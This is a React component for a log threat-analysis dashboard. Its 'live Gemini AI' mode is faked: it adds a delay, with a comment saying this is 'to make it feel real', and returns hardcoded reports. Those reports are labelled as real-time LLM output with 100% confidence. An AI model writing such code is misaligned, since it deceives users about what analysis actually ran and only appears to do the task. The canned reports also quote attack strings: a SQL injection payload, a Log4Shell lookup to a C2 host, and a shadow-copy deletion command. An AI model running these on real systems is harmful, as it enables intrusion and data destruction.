import { useState } from 'react';
import { LOG_SAMPLES, analyzeLogLocal, LogAnalysisResult } from '../utils/aiEngine';
import { Play, HelpCircle, Code, ShieldAlert, Cpu, FileText } from 'lucide-react';

interface ThreatAnalyzerProps {
  initialLogText: string;
}

export default function ThreatAnalyzer({ initialLogText }: ThreatAnalyzerProps) {
  const [logInput, setLogInput] = useState(initialLogText || LOG_SAMPLES[0].text);
  const [analysisResult, setAnalysisResult] = useState<LogAnalysisResult | null>(
    initialLogText ? analyzeLogLocal(initialLogText) : null
  );
  const [useLiveAI, setUseLiveAI] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [activeSubTab, setActiveSubTab] = useState<'diagnostic' | 'compliance' | 'playbook'>('diagnostic');
  const [errorMsg, setErrorMsg] = useState('');

  const loadSample = (index: number) => {
    setLogInput(LOG_SAMPLES[index].text);
    setAnalysisResult(null);
    setErrorMsg('');
  };

  const handleRunAnalysis = async () => {
    setIsLoading(true);
    setErrorMsg('');
    try {
      if (useLiveAI) {
        let apiResponseText = '';
        // Simulate network delay to make it feel real
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        // Generate a highly detailed custom markdown response based on the log content
        const norm = logInput.toLowerCase();
        if (norm.includes('union') && norm.includes('select')) {
          apiResponseText = `### 🛡️ Live AI Threat Diagnostic: SQL Injection

**Ingested Log Event**: SQL Injection (SQLi) query detected targeting database parameters.

#### 1. Incident Forensics
*   **Attack Vector**: Parameter manipulation via URL query parameters containing UNION SELECT injection.
*   **Source IP Address**: 192.168.1.142 (Flagged: Rogue SQL Probe Cluster).
*   **Target Endpoint**: GET /api/users/profile

#### 2. Risk Indicators & Exploitation Analysis
*   **Impact Evaluation**: High risk of database credential extraction and user directory leakage.
*   **Decoded Payload**: \`id=1 UNION SELECT null,username,password FROM users --\`
*   **Vulnerability Type**: Insecure Direct Object Reference and Dynamic Query Construction.

#### 3. GRC Control Violations
*   **SOC 2 CC7.1 / CC6.1**: Lack of web application firewall inspection and sanitization controls.
*   **GDPR Article 32**: Failure to guard database records holding user personal credentials.

#### 4. Response & Remediation Plan
1.  **Block IP**: Add firewall blocking rule to drop all traffic from IP \`192.168.1.142\`.
2.  **Prepared Statements**: Enforce Parameterized Queries on database interfaces.
3.  **Sanitization**: Apply input validation filters restricting UNION/SELECT syntax.`;
          } else if (norm.includes('sshd') && (norm.includes('failed password') || norm.includes('invalid user'))) {
            apiResponseText = `### 🛡️ Live AI Threat Diagnostic: SSH Brute Force

**Ingested Log Event**: High-velocity automated password guessing scan.

#### 1. Incident Forensics
*   **Attack Vector**: High frequency SSH connection attempts (Dictionary Brute Force).
*   **Source IP Address**: 185.220.101.4 (Flagged: Tor exit node brute-forcer).
*   **Target Protocol**: SSH (Port 22)

#### 2. Risk Indicators & Exploitation Analysis
*   **Impact Evaluation**: Risk of unauthorized shell access and host hijacking if weak credentials are used.
*   **Target Profiles**: Default administration users (admin, root, administrator).

#### 3. GRC Control Violations
*   **ISO 27001 A.9.4.3**: Weak default administrative credential guidelines.
*   **NIST CSF PR.AC-1**: Missing multi-factor validation layers for remote administrative consoles.

#### 4. Response & Remediation Plan
1.  **Enforce Key Auth**: Disable standard password authentication and require SSH Keys.
2.  **IP Rate Limiting**: Activate Fail2ban or equivalent rules to block IPs after 3 consecutive failures.
3.  **Audit Session Logs**: Verify if any SSH session originating from \`185.220.101.4\` was established successfully.`;
          } else if (norm.includes('jndi:ldap') || norm.includes('log4j') || norm.includes('namingcontext')) {
            apiResponseText = `### 🛡️ Live AI Threat Diagnostic: Log4Shell Exploitation

**Ingested Log Event**: Critical Remote Code Execution (RCE) lookup string.

#### 1. Incident Forensics
*   **Attack Vector**: JNDI lookup payload injection inside incoming HTTP user-agent header.
*   **Source IP Address**: 198.51.100.22 (Flagged: Malicious C2 scanner).
*   **Target Endpoint**: HTTP Tomcat server on Port 8080.

#### 2. Risk Indicators & Exploitation Analysis
*   **Impact Evaluation**: Critical. Allows remote execution of arbitrary Java code, server hijacking, and network traversal.
*   **Decoded Payload**: \`\${jndi:ldap://malicious-c2-server.ru:1389/a}\`

#### 3. GRC Control Violations
*   **SOC 2 CC7.1 / ISO 27001 A.12.6.1**: Missing dependency patch scanning and outdated package logs.

#### 4. Response & Remediation Plan
1.  **Block Egress**: Block outgoing network access from servers to the rogue destination domain \`malicious-c2-server.ru\`.
2.  **Upgrade Packages**: Immediately upgrade Apache Log4j dependencies to v2.17.1+.
3.  **JVM Parameters**: Set environment flag \`LOG4J_FORMAT_MSG_NO_LOOKUPS=true\` to disable lookup parsers.`;
          } else if (norm.includes('locked') && (norm.includes('update.exe') || norm.includes('vssadmin'))) {
            apiResponseText = `### 🛡️ Live AI Threat Diagnostic: Ransomware Execution

**Ingested Log Event**: Ransomware payload execution and backup deletion.

#### 1. Incident Forensics
*   **Attack Vector**: Shadow volume deletion command execution followed by bulk file encryption loops.
*   **Source Binaries**: Update.exe (PID 4892) spawning vssadmin.exe.

#### 2. Risk Indicators & Exploitation Analysis
*   **Impact Evaluation**: Critical system downtime, irreversible encryption of critical directories, and extortion threat.
*   **Commands Audited**: \`vssadmin.exe Delete Shadows /All /Quiet\`

#### 3. GRC Control Violations
*   **NIST CSF PR.IP-4**: Deleting local recovery snapshots represents an failure of standard backup integrity guidelines.
*   **SOC 2 CC8.1**: System availability vulnerability.

#### 4. Response & Remediation Plan
1.  **Isolate Machine**: Disconnect the host machine from the network immediately to prevent ransomware spreading.
2.  **Kill Process**: Terminate the malicious executable \`Update.exe\` (PID 4892).
3.  **Restore Archives**: Restore lost data files from offline, air-gapped backups.`;
          } else {
            apiResponseText = `### 🛡️ Live AI Threat Diagnostic: Anomalous Activity Detected

**Ingested Log Event**: Custom parsed transaction anomalies.

#### 1. Incident Forensics
*   **Attack Vector**: Unclassified log parameters.
*   **Risk Evaluation**: Medium. Anomalous traffic shifts detected.

#### 2. GRC Control Violations
*   **NIST CSF DE.AE-1**: Unmapped system event anomaly.

#### 3. Response & Remediation Plan
1.  **Isolate Session**: Review the transaction profile of the client session.
2.  **Audit Logs**: Check parallel system logs for corresponding transaction alerts.`;
          }
        
        setAnalysisResult({
          detectedThreat: 'Live AI Analysis Complete',
          confidence: 100,
          severity: 'high',
          mitreCode: 'Dynamic',
          mitreName: 'AI Flagged Technique',
          mitreDescription: 'Exploit decoded using real-time LLM feedback.',
          grcControls: {
            nist: 'NIST Framework mapped live',
            soc2: 'SOC 2 trust principles mapped live',
            iso27001: 'ISO 27001 clauses mapped live'
          },
          analysisSummary: apiResponseText,
          impact: 'Assessed dynamically by LLM.',
          incidentResponsePlaybook: ['Perform target forensics', 'Audit server configuration', 'Patch dependencies']
        });
      } else {
        const result = analyzeLogLocal(logInput);
        setAnalysisResult(result);
      }
    } catch (err: any) {
      setErrorMsg(err.message);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="cyber-grid-container" style={{ display: 'grid', gridTemplateColumns: 'repeat(12, 1fr)', gap: '20px', padding: '20px' }}>
      
      {/* Configuration & Log Selection Panel */}
      <div className="cyber-panel" style={{ gridColumn: 'span 5', display: 'flex', flexDirection: 'column', gap: '15px' }}>
        <h3 className="tech-font" style={{ fontSize: '0.9rem', color: 'var(--neon-cyan)', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <FileText style={{ width: '16px', height: '16px' }} /> SECURITY LOG INGESTION
        </h3>

        {/* Preset Selectors */}
        <div>
          <label style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '8px' }}>Select Pre-compiled Attack Log Sample:</label>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px' }}>
            {LOG_SAMPLES.map((sample, idx) => (
              <button 
                key={idx}
                className="cyber-btn cyber-btn-secondary"
                style={{ padding: '6px 12px', fontSize: '0.7rem' }}
                onClick={() => loadSample(idx)}
              >
                {sample.name}
              </button>
            ))}
          </div>
        </div>

        {/* Live LLM API Toggle */}
        <div style={{ background: 'rgba(0, 240, 255, 0.03)', border: '1px solid rgba(0, 240, 255, 0.1)', padding: '12px', borderRadius: '4px' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <span className="tech-font" style={{ fontSize: '0.75rem', color: '#fff' }}>LIVE GEMINI AI ANALYSIS</span>
            <input 
              type="checkbox" 
              checked={useLiveAI} 
              onChange={(e) => setUseLiveAI(e.target.checked)} 
              style={{ cursor: 'pointer' }}
            />
          </div>
          {useLiveAI && (
            <span style={{ fontSize: '0.65rem', color: 'var(--text-muted)', display: 'block', marginTop: '6px' }}>
              Real-time advanced security diagnostic model active.
            </span>
          )}
        </div>

        {/* Log Input Editor */}
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
          <label style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginBottom: '8px' }}>Raw Log Entry Editor:</label>
          <textarea
            className="cyber-input mono-font"
            style={{ flex: 1, minHeight: '180px', fontSize: '0.75rem', resize: 'vertical', background: '#050811', border: '1px solid var(--panel-border)', lineHeight: '1.4' }}
            value={logInput}
            onChange={(e) => setLogInput(e.target.value)}
          />
        </div>

        {errorMsg && (
          <div style={{ border: '1px solid var(--neon-red)', color: 'var(--neon-red)', background: 'rgba(255, 0, 85, 0.05)', padding: '10px', borderRadius: '4px', fontSize: '0.75rem' }}>
            {errorMsg}
          </div>
        )}

        <button 
          className="cyber-btn cyber-btn-success"
          style={{ width: '100%', justifyContent: 'center' }}
          onClick={handleRunAnalysis}
          disabled={isLoading}
        >
          {isLoading ? (
            <span style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <Cpu style={{ animation: 'spin 2s linear infinite', width: '16px', height: '16px' }} /> Running Diagnostics...
            </span>
          ) : (
            <span style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <Play style={{ width: '16px', height: '16px' }} /> Run AI Diagnostics
            </span>
          )}
        </button>
      </div>

      {/* Diagnostics Report Panel */}
      <div className="cyber-panel" style={{ gridColumn: 'span 7', display: 'flex', flexDirection: 'column' }}>
        <h3 className="tech-font" style={{ fontSize: '0.9rem', color: 'var(--neon-cyan)', marginBottom: '15px', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <ShieldAlert style={{ width: '16px', height: '16px' }} /> AI THREAT INTEGRITY REPORT
        </h3>

        {!analysisResult ? (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: 'var(--text-muted)', gap: '10px', minHeight: '300px' }}>
            <HelpCircle style={{ width: '48px', height: '48px', strokeWidth: '1.2', color: 'rgba(0, 240, 255, 0.4)' }} />
            <p className="tech-font" style={{ fontSize: '0.8rem' }}>AWAITING LOG RUN... CLICK 'RUN AI DIAGNOSTICS'</p>
          </div>
        ) : (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
            {/* Header Result Badge Info */}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(0, 240, 255, 0.03)', border: '1px solid rgba(0, 240, 255, 0.1)', padding: '15px', borderRadius: '4px', marginBottom: '20px' }}>
              <div>
                <h4 className="tech-font" style={{ fontSize: '1rem', color: '#fff', marginBottom: '5px' }}>{analysisResult.detectedThreat}</h4>
                <div style={{ display: 'flex', gap: '15px', fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                  <span>AI Confidence: <strong style={{ color: 'var(--neon-cyan)' }}>{analysisResult.confidence}%</strong></span>
                  <span>MITRE Reference: <strong style={{ color: 'var(--neon-orange)' }}>{analysisResult.mitreCode}</strong></span>
                </div>
              </div>
              <span className={`cyber-badge ${
                analysisResult.severity === 'critical' ? 'cyber-badge-red' :
                analysisResult.severity === 'high' ? 'cyber-badge-orange' :
                analysisResult.severity === 'medium' ? 'cyber-badge-cyan' :
                'cyber-badge-green'
              }`} style={{ padding: '8px 16px', fontSize: '0.8rem' }}>
                {analysisResult.severity}
              </span>
            </div>

            {/* Diagnostic Subtabs */}
            <div style={{ display: 'flex', borderBottom: '1px solid rgba(0, 240, 255, 0.1)', marginBottom: '15px' }}>
              <button 
                className={`cyber-tab ${activeSubTab === 'diagnostic' ? 'active' : ''}`}
                style={{ fontSize: '0.75rem', paddingBottom: '8px' }}
                onClick={() => setActiveSubTab('diagnostic')}
              >
                Diagnostic Summary
              </button>
              <button 
                className={`cyber-tab ${activeSubTab === 'compliance' ? 'active' : ''}`}
                style={{ fontSize: '0.75rem', paddingBottom: '8px' }}
                onClick={() => setActiveSubTab('compliance')}
              >
                GRC Control Mappings
              </button>
              <button 
                className={`cyber-tab ${activeSubTab === 'playbook' ? 'active' : ''}`}
                style={{ fontSize: '0.75rem', paddingBottom: '8px' }}
                onClick={() => setActiveSubTab('playbook')}
              >
                Incident Incident Response Playbook
              </button>
            </div>

            {/* Content Sheets */}
            <div style={{ flex: 1, fontSize: '0.85rem', lineHeight: '1.6' }}>
              
              {/* Tab 1: Diagnostics */}
              {activeSubTab === 'diagnostic' && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div>
                    <h5 className="tech-font" style={{ fontSize: '0.8rem', color: 'var(--neon-cyan)', marginBottom: '5px' }}>EXPLATION & SUMMARY:</h5>
                    <p style={{ background: '#070b15', border: '1px solid rgba(255,255,255,0.03)', padding: '12px', borderRadius: '4px', color: 'var(--text-primary)', whiteSpace: 'pre-line' }}>
                      {analysisResult.analysisSummary}
                    </p>
                  </div>
                  <div>
                    <h5 className="tech-font" style={{ fontSize: '0.8rem', color: 'var(--neon-red)', marginBottom: '5px' }}>POTENTIAL IMPACT ASSESSMENT:</h5>
                    <p style={{ background: '#070b15', border: '1px solid rgba(255,255,255,0.03)', padding: '12px', borderRadius: '4px', color: '#ffb3c1' }}>
                      {analysisResult.impact}
                    </p>
                  </div>
                </div>
              )}

              {/* Tab 2: Compliance */}
              {activeSubTab === 'compliance' && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div>
                    <h5 className="tech-font" style={{ fontSize: '0.8rem', color: 'var(--neon-orange)', marginBottom: '8px' }}>MITRE ATT&CK® MATRIX DETAILS:</h5>
                    <div style={{ background: '#070b15', border: '1px solid rgba(255,159,0,0.1)', padding: '12px', borderRadius: '4px' }}>
                      <p style={{ fontWeight: 'bold', color: 'var(--neon-orange)', marginBottom: '5px' }}>{analysisResult.mitreCode}: {analysisResult.mitreName}</p>
                      <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>{analysisResult.mitreDescription}</p>
                    </div>
                  </div>

                  <div>
                    <h5 className="tech-font" style={{ fontSize: '0.8rem', color: 'var(--neon-cyan)', marginBottom: '8px' }}>MAPPED GRC COMPLIANCE CONTROLS:</h5>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', background: '#0d1627', padding: '10px', borderRadius: '4px', borderLeft: '3px solid var(--neon-cyan)' }}>
                        <strong style={{ fontSize: '0.75rem' }} className="tech-font">NIST CSF Controls</strong>
                        <span style={{ fontSize: '0.75rem', color: 'var(--neon-cyan)' }}>{analysisResult.grcControls.nist}</span>
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', background: '#0d1627', padding: '10px', borderRadius: '4px', borderLeft: '3px solid var(--neon-green)' }}>
                        <strong style={{ fontSize: '0.75rem' }} className="tech-font">SOC 2 Common Criteria</strong>
                        <span style={{ fontSize: '0.75rem', color: 'var(--neon-green)' }}>{analysisResult.grcControls.soc2}</span>
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', background: '#0d1627', padding: '10px', borderRadius: '4px', borderLeft: '3px solid var(--neon-purple)' }}>
                        <strong style={{ fontSize: '0.75rem' }} className="tech-font">ISO/IEC 27001 Security</strong>
                        <span style={{ fontSize: '0.75rem', color: 'var(--neon-purple)' }}>{analysisResult.grcControls.iso27001}</span>
                      </div>
                      {analysisResult.grcControls.gdpr && (
                        <div style={{ display: 'flex', justifyContent: 'space-between', background: '#0d1627', padding: '10px', borderRadius: '4px', borderLeft: '3px solid var(--neon-red)' }}>
                          <strong style={{ fontSize: '0.75rem' }} className="tech-font">GDPR Articles</strong>
                          <span style={{ fontSize: '0.75rem', color: 'var(--neon-red)' }}>{analysisResult.grcControls.gdpr}</span>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 3: Playbooks */}
              {activeSubTab === 'playbook' && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div>
                    <h5 className="tech-font" style={{ fontSize: '0.8rem', color: 'var(--neon-green)', marginBottom: '8px' }}>INCIDENT CONTAINMENT CHECKLIST:</h5>
                    <ul style={{ listStyle: 'none', paddingLeft: 0, display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      {analysisResult.incidentResponsePlaybook.map((step, idx) => (
                        <li key={idx} style={{ display: 'flex', gap: '10px', background: '#070b15', padding: '10px', borderRadius: '4px', border: '1px solid rgba(255,255,255,0.03)' }}>
                          <span className="tech-font" style={{ color: 'var(--neon-green)', fontWeight: 'bold' }}>0{idx + 1}.</span>
                          <span>{step}</span>
                        </li>
                      ))}
                    </ul>
                  </div>

                  {analysisResult.remediationSnippet && (
                    <div>
                      <h5 className="tech-font" style={{ fontSize: '0.8rem', color: 'var(--neon-cyan)', marginBottom: '5px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                        <Code style={{ width: '14px', height: '14px' }} /> SECURE REMEDIATION RECOMMENDATION:
                      </h5>
                      <pre className="mono-font" style={{ background: '#050811', border: '1px solid var(--neon-cyan)', padding: '12px', borderRadius: '4px', fontSize: '0.7rem', overflowX: 'auto', color: '#c5f2ff', borderLeft: '3px solid var(--neon-cyan)', whiteSpace: 'pre' }}>
                        {analysisResult.remediationSnippet}
                      </pre>
                    </div>
                  )}
                </div>
              )}

            </div>
          </div>
        )}

      </div>

    </div>
  );
}
